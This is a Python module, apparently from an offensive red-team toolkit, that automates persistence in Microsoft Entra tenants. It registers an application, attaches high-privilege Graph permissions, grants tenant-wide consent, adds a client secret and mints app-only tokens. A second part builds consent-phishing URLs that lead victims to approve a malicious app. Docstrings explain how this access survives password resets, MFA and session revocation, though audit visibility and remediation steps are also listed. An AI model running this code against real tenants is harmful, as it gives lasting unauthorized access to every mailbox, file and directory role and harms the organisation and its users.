# ============================================================================
# FILE: core/appconsent.py
# ============================================================================
"""App-only persistence: access that survives the user entirely.

Every technique so far ends when the user's credentials, session or device stop working. This
one does not touch the user at all.

Register an application, give it the API permissions the target holds (or more), and grant it
consent. From then on the attacker authenticates AS THE APPLICATION - a client-credentials
token, no user, no password, no MFA, no device, no session. Password reset does not touch it.
Revoking the user's sessions does not touch it. Conditional access that requires a compliant
device does not apply to it. DBSC and CAE never see it, because there is no browser session to
bind or evaluate. It survives until someone finds the app and removes the grant.

That is why it sits above AiTM and above the PRT: a PRT is a device credential (revocable by
de-registering the device), a session is a user credential (revocable by a password reset or a
revocation), and this is neither.

What it needs: `Application.ReadWrite.All` (or Global Administrator / Cloud Application
Administrator). `core.tier0` reports whether the captured identity carries it. Admin consent is
the usual requirement for the scopes worth having - which is why the same technique is also
used with a user-facing consent page, where the victim approves the app themselves.

Everything here is an audited API call. The point is not stealth: it is that the resulting
credential is not tied to the identity that created it.
"""
import json
import time

__all__ = ["AppConsentError", "GRAPH", "MICROSOFT_GRAPH_APP_ID", "plan", "register_app",
           "add_permissions", "grant_consent", "add_password", "app_token", "revoke",
           "describe", "SCOPES"]

GRAPH = "https://graph.microsoft.com/v1.0"
# Microsoft Graph's own resource app id (the API every permission below belongs to).
MICROSOFT_GRAPH_APP_ID = "00000003-0000-0000-c000-000000000000"

# The permissions worth asking for, with what each one buys. Application permissions (app-only)
# are the ones that need admin consent and that no user session can revoke.
SCOPES = {
    "Mail.Read": "read every mailbox in the tenant",
    "Mail.ReadWrite": "read and modify every mailbox",
    "Mail.Send": "send as anyone",
    "Files.ReadWrite.All": "read and write every file in every site",
    "Sites.ReadWrite.All": "read and write every SharePoint site",
    "User.ReadWrite.All": "read and modify every user (including passwords)",
    "Group.ReadWrite.All": "read and modify every group and its membership",
    "Directory.ReadWrite.All": "read and write the directory (roles, users, apps)",
    "Application.ReadWrite.All": "create and modify applications and their credentials",
    "RoleManagement.ReadWrite.Directory": "assign any directory role to anyone",
}


class AppConsentError(RuntimeError):
    """A refusal the CLI can report verbatim."""


def plan(app_name="", scopes=None, admin_consent=True, tenant=""):
    """The steps, what each needs, and why the result outlives the user."""
    wanted = list(scopes or ["Mail.Read", "Files.ReadWrite.All"])
    unknown = [s for s in wanted if s not in SCOPES]
    return {
        "app_name": app_name or "reporting-connector",
        "scopes": wanted,
        "unknown_scopes": unknown,
        "admin_consent": bool(admin_consent),
        "tenant": tenant,
        "steps": [
            {"step": 1, "call": "POST /applications",
             "needs": "Application.ReadWrite.All",
             "what": f"register {app_name or 'reporting-connector'} in the tenant"},
            {"step": 2, "call": "PATCH /applications/<id> (requiredResourceAccess)",
             "needs": "Application.ReadWrite.All",
             "what": "attach the application permissions: " + ", ".join(wanted)},
            {"step": 3, "call": "POST /oauth2PermissionGrants (or an admin-consent URL)",
             "needs": "admin consent (or the user's, for the scopes a user can grant)",
             "what": "grant consent so the app can use those permissions without a user"},
            {"step": 4, "call": "POST /applications/<id>/addPassword",
             "needs": "Application.ReadWrite.All",
             "what": "add a client secret (or upload a certificate, which is quieter and "
                     "longer-lived)"},
            {"step": 5, "call": "POST /oauth2/v2.0/token (client_credentials)",
             "needs": "the client id and the secret",
             "what": "mint an app-only token: no user, no password, no MFA, no device"},
        ],
        "survives": [
            "a password reset (the app has no password)",
            "MFA and passkey changes (no interactive sign-in happens)",
            "device-bound sessions, DBSC and CAE (there is no browser session)",
            "session revocation for the user (the app is not the user)",
            "the user being deleted, until the app is removed",
        ],
        "visible": [
            "the audit log records the application registration, the permission change, the "
            "consent grant and the credential add - four entries",
            "the app appears in Enterprise Applications / App registrations, and an app-only "
            "sign-in shows as the application, not as a user",
            "a permission grant for Directory.ReadWrite.All or Mail.ReadWrite.All is a "
            "high-severity alert in any tenant that monitors consent",
        ],
        "remediation": ("remove the oauth2PermissionGrant, delete the application's credentials "
                        "and then the application; a tenant that only revokes user sessions has "
                        "not touched it"),
        "created": time.time(),
    }


def register_app(access_token, display_name, post=None, timeout=15, sign_in_audience="AzureADMyOrg"):
    """Step 1: register the application."""
    if not access_token:
        raise AppConsentError("registering an app needs an access token")
    if not str(display_name or "").strip():
        raise AppConsentError("an application needs a display name")
    return _graph("POST", f"{GRAPH}/applications", access_token,
                  {"displayName": str(display_name), "signInAudience": sign_in_audience},
                  post=post, timeout=timeout)


def role_ids(access_token, resource_app_id=MICROSOFT_GRAPH_APP_ID, get=None, timeout=15):
    """The permission name -> id map, read from the tenant itself.

    The ids are published per API version and they change when Microsoft does, so they are
    FETCHED rather than hardcoded: a guessed GUID either grants nothing or grants the wrong
    thing, and neither is worth the risk. Returns {name: id} for both application roles
    (`appRoles`) and delegated scopes (`oauth2PermissionScopes`).
    """
    if not access_token:
        raise AppConsentError("resolving permission ids needs an access token")
    # a raw space in an OData filter is an invalid URL (http.client refuses it), so the query
    # is quoted: the `$` and the quotes stay readable, the spaces become %20
    from urllib.parse import quote
    query = (f"$filter=appId eq '{resource_app_id}'"
             "&$select=id,appId,appRoles,oauth2PermissionScopes")
    url = f"{GRAPH}/servicePrincipals?{quote(query, safe='$=,')}"
    answer = _graph("GET", url, access_token, None, post=None if get is None else get,
                    timeout=timeout) if get is None else _check(get(url, timeout), url)
    rows = (answer or {}).get("value") or []
    out = {}
    for row in rows:
        for role in row.get("appRoles") or []:
            if role.get("value"):
                out.setdefault(str(role["value"]), str(role.get("id") or ""))
        for scope in row.get("oauth2PermissionScopes") or []:
            if scope.get("value"):
                out.setdefault(str(scope["value"]), str(scope.get("id") or ""))
    return out


def add_permissions(access_token, app_object_id, resource_app_id=MICROSOFT_GRAPH_APP_ID,
                    app_roles=None, delegated=None, post=None, timeout=15, ids=None):
    """Step 2: attach application (and optionally delegated) permissions.

    `app_roles` are the APPLICATION permissions (the app-only ones: no user involved), and
    `delegated` are the ones that act on behalf of a signed-in user.
    """
    if not access_token:
        raise AppConsentError("changing permissions needs an access token")
    if not str(app_object_id or "").strip():
        raise AppConsentError("no application object id")
    # `ids=None` means "read the table from the tenant"; `ids={}` means "use this table as-is"
    # (a caller that already has the ids, or a test). The two are different questions and
    # collapsing them made an injected table silently trigger a live call.
    table = dict(ids) if ids is not None else (
        role_ids(access_token, resource_app_id, timeout=timeout)
        if (app_roles or delegated) else {})
    roles = [{"id": _role_id(name, table), "type": "Role"} for name in (app_roles or [])]
    scopes = [{"id": _role_id(name, table), "type": "Scope"} for name in (delegated or [])]
    if not roles and not scopes:
        raise AppConsentError("no permissions to add (app_roles or delegated)")
    body = {"requiredResourceAccess": [{"resourceAppId": resource_app_id,
                                        "resourceAccess": roles + scopes}]}
    return _graph("PATCH", f"{GRAPH}/applications/{app_object_id}", access_token, body,
                  post=post, timeout=timeout)


def grant_consent(access_token, client_id, resource_id=MICROSOFT_GRAPH_APP_ID, scopes=None,
                  principal_id="", post=None, timeout=15):
    """Step 3: grant consent so the app can act without a user.

    An empty `principal_id` is the tenant-wide (all principals) grant an admin consent creates.
    """
    if not access_token:
        raise AppConsentError("granting consent needs an access token")
    if not str(client_id or "").strip():
        raise AppConsentError("no client id to grant consent to")
    scope_text = " ".join(str(s) for s in (scopes or []))
    body = {"clientId": str(client_id), "consentType": "AllPrincipals",
            "resourceId": str(resource_id), "scope": scope_text}
    if principal_id:
        body["consentType"] = "Principal"
        body["principalId"] = str(principal_id)
    return _graph("POST", f"{GRAPH}/oauth2PermissionGrants", access_token, body,
                  post=post, timeout=timeout)


def add_password(access_token, app_object_id, display_name="rotation", months=24, post=None,
                 timeout=15):
    """Step 4: add a client secret (the returned value is shown once)."""
    if not access_token:
        raise AppConsentError("adding a credential needs an access token")
    end = time.time() + int(months or 24) * 30 * 86400
    body = {"passwordCredential": {
        "displayName": str(display_name),
        "endDateTime": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(end))}}
    answer = _graph("POST", f"{GRAPH}/applications/{app_object_id}/addPassword", access_token,
                    body, post=post, timeout=timeout)
    if not answer.get("secretText"):
        # a 200 that is not a credential object used to return {"secretText": ""} and the
        # operator would try to authenticate with nothing, with no error to explain it
        raise AppConsentError(
            "the tenant answered without a secret: the credential was not created (check that "
            "the response is a passwordCredential object, and that Application.ReadWrite.All "
            "is granted)")
    return {"secretText": answer["secretText"], "keyId": answer.get("keyId", ""),
            "hint": answer.get("hint", "")}


def app_token(client_id, client_secret, tenant="common", scope="https://graph.microsoft.com/.default",
              post=None, timeout=15):
    """Step 5: the app-only token - the credential that has no user behind it."""
    if not client_id or not client_secret:
        raise AppConsentError("an app-only token needs the client id and the secret")
    from urllib.parse import urlencode
    url = f"https://login.microsoftonline.com/{tenant or 'common'}/oauth2/v2.0/token"
    data = {"grant_type": "client_credentials", "client_id": client_id,
            "client_secret": client_secret, "scope": scope}
    if post is not None:
        return _check_token(post(url, data, timeout))
    import urllib.error
    import urllib.request

    from core import net
    body = urlencode(data).encode()
    req = urllib.request.Request(url, data=body, headers={
        "Content-Type": "application/x-www-form-urlencoded"})
    try:
        with net.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        raise AppConsentError(f"{url} is unreachable ({type(e).__name__})") from e
    try:
        answer = json.loads(raw)
    except ValueError as e:
        raise AppConsentError(f"non-JSON answer: {raw[:200]}") from e
    return _check_token(answer)


def _check_token(answer):
    """A token-endpoint refusal becomes an AppConsentError, whatever carried the answer."""
    if isinstance(answer, dict) and answer.get("error"):
        raise AppConsentError(f"the tenant refused: "
                              f"{answer.get('error_description') or answer['error']}")
    if not isinstance(answer, dict) or not answer.get("access_token"):
        # report the SHAPE, never the values: the whole answer contains the refresh token, and
        # an exception message ends up in logs, in a terminal, and in a screenshot
        keys = ", ".join(sorted(str(k) for k in (answer or {}))) or "nothing"
        raise AppConsentError(f"the token answer carried no access_token (keys: {keys})")
    return answer


def consent_url(client_id, redirect_uri, scopes=None, tenant="common", state="",
                prompt="consent", issuer=""):
    """The consent URL: the victim approves YOUR app themselves, on the REAL provider page.

    This is the half that needs no administrator. The user is sent to the provider's own consent
    screen, they read "this app wants to read your mail", and they approve it - and the app now
    holds a token that acts on their behalf, with a refresh token that keeps working after their
    password changes.

    Nothing here is a lookalike: the page is the provider's, the approval is genuine, and the
    resulting grant is a real, auditable consent. What makes it work is that a user can consent
    on their own for the delegated scopes, and that the consent screen is a wall of text nobody
    reads.
    """
    if not str(client_id or "").strip():
        raise AppConsentError("a consent URL needs a client id")
    if not str(redirect_uri or "").strip():
        raise AppConsentError("a consent URL needs a redirect URI (registered on the app)")
    wanted = list(scopes or ["offline_access", "openid", "profile",
                             "https://graph.microsoft.com/Mail.Read",
                             "https://graph.microsoft.com/Files.ReadWrite.All"])
    from urllib.parse import quote, urlencode
    base = (issuer or f"https://login.microsoftonline.com/{tenant or 'common'}/oauth2/v2.0")
    query = urlencode({"client_id": client_id, "response_type": "code",
                       "redirect_uri": redirect_uri, "response_mode": "query",
                       "scope": " ".join(wanted), "prompt": prompt, "state": state or ""})
    return {"url": f"{base}/authorize?{query}", "scopes": wanted,
            "client_id": client_id, "redirect_uri": redirect_uri,
            "what_it_grants": [SCOPES.get(sc.split("/")[-1], sc) for sc in wanted],
            "quiet": quote("", safe="") or ""}


def consent_plan(client_id="", redirect_uri="", scopes=None, tenant="common"):
    """What the user-facing consent path needs, and what it buys over admin consent."""
    url = {}
    if client_id and redirect_uri:
        url = consent_url(client_id, redirect_uri, scopes=scopes, tenant=tenant)
    return {
        "client_id": client_id, "redirect_uri": redirect_uri, "tenant": tenant,
        "url": url.get("url", ""),
        "what_it_grants": url.get("what_it_grants", []),
        "steps": [
            {"step": 1, "what": "register an app (a public client, or a confidential one with a "
                                "secret) with the redirect URI pointing at the campaign"},
            {"step": 2, "what": "send the victim to the consent URL - the provider's own page, "
                                "not a lookalike"},
            {"step": 3, "what": "the victim approves; the code arrives at the redirect URI"},
            {"step": 4, "what": "exchange the code (see core.oauth) and keep the refresh token"},
            {"step": 5, "what": "the refresh token acts as the user, and survives their "
                                "password change - it dies only when the consent is revoked"},
        ],
        "why_it_works": ("a user may consent on their own for delegated scopes, and the consent "
                         "screen is a wall of text nobody reads; the grant is real and auditable, "
                         "which is exactly why it is durable"),
        "needs_no_admin": True,
        "survives": [
            "the victim's password change (the grant is not a password)",
            "their MFA prompts (the app is not signing in interactively)",
            "their session being revoked (the refresh token is the app's, not the session's)",
        ],
        "stops_it": [
            "a tenant that requires admin consent for all apps (the default in many, but not "
            "all)",
            "user consent disabled, or restricted to verified publishers",
            "the user reading the consent screen, or reporting it",
            "periodic review of enterprise applications and their grants",
        ],
        "visible": ("the grant appears in the user's own 'apps and services' page and in the "
                    "tenant's audit log as a consent, with the app's name"),
    }


def revoke(access_token, app_object_id="", grant_id="", post=None, timeout=15):
    """The clean-up path: remove the consent grant, then the application."""
    out = {}
    if grant_id:
        out["grant"] = _graph("DELETE", f"{GRAPH}/oauth2PermissionGrants/{grant_id}",
                              access_token, None, post=post, timeout=timeout)
    if app_object_id:
        out["app"] = _graph("DELETE", f"{GRAPH}/applications/{app_object_id}", access_token,
                            None, post=post, timeout=timeout)
    if not out:
        raise AppConsentError("nothing to revoke (pass a grant id or an application object id)")
    return out


def describe(facts):
    if facts.get("client_id") is not None and "steps" in (facts or {}):
        lines = [f"consent-phishing plan (client {facts.get('client_id')})"]
        if facts.get("url"):
            lines.append(f"  consent URL: {facts['url'][:150]}")
            lines.append(f"  grants: {', '.join(facts['what_it_grants'][:5])}")
        for step in facts["steps"]:
            lines.append(f"  {step['step']}. {step['what']}")
        lines.append(f"  needs no admin: {facts.get('needs_no_admin')}")
        lines.append("  survives:")
        for item in facts["survives"]:
            lines.append(f"    - {item}")
        lines.append("  stops it:")
        for item in facts["stops_it"]:
            lines.append(f"    - {item}")
        return "\n".join(lines)
    if "steps" in (facts or {}):
        lines = [f"app-only persistence plan ({facts.get('app_name')})",
                 f"  permissions: {', '.join(facts['scopes'])}"]
        if facts.get("unknown_scopes"):
            lines.append(f"  ! not in the known list (still valid, the id is what matters): "
                         f"{', '.join(facts['unknown_scopes'])}")
        for step in facts["steps"]:
            lines.append(f"  {step['step']}. {step['call']}")
            lines.append(f"     {step['what']}  [needs: {step['needs']}]")
        lines.append("  survives:")
        for item in facts["survives"]:
            lines.append(f"    - {item}")
        lines.append(f"  remediation: {facts['remediation']}")
        return "\n".join(lines)
    return f"app consent: {str(facts)[:300]}"


def _role_id(name, table=None):
    """A permission name (or a GUID) to its id, using the table read from the tenant.

    A name that the tenant did not report raises: a guessed GUID either grants nothing or
    grants the wrong permission, and silently attaching the wrong one is the kind of mistake an
    engagement does not survive.
    """
    text = str(name or "").strip()
    if len(text) == 36 and text.count("-") == 4:
        return text
    found = (table or {}).get(text)
    if found:
        return found
    raise AppConsentError(
        f"the tenant did not report a permission id for {name!r} (nothing was guessed). Pass "
        f"the GUID, or call role_ids() against a tenant that publishes it. Known descriptions "
        f"here: {', '.join(sorted(SCOPES))}")


def _graph(method, url, access_token, payload, post=None, timeout=15):
    if post is not None:
        return _check(post(method, url, payload, timeout, access_token), url)
    import urllib.error
    import urllib.request

    from core import net
    body = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=body, method=method, headers={
        "Content-Type": "application/json", "Accept": "application/json",
        "Authorization": f"Bearer {access_token}"})
    try:
        with net.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        raise AppConsentError(f"{url} is unreachable ({type(e).__name__})") from e
    if not raw.strip():
        return {"ok": True, "status": "empty"}
    try:
        answer = json.loads(raw)
    except ValueError as e:
        raise AppConsentError(f"non-JSON answer from {url}: {raw[:200]}") from e
    return _check(answer, url)


def _check(answer, url):
    if isinstance(answer, dict) and answer.get("error"):
        err = answer["error"]
        msg = err.get("message") if isinstance(err, dict) else str(err)
        raise AppConsentError(f"the tenant refused: {msg}")
    return answer if isinstance(answer, dict) else {"raw": answer}
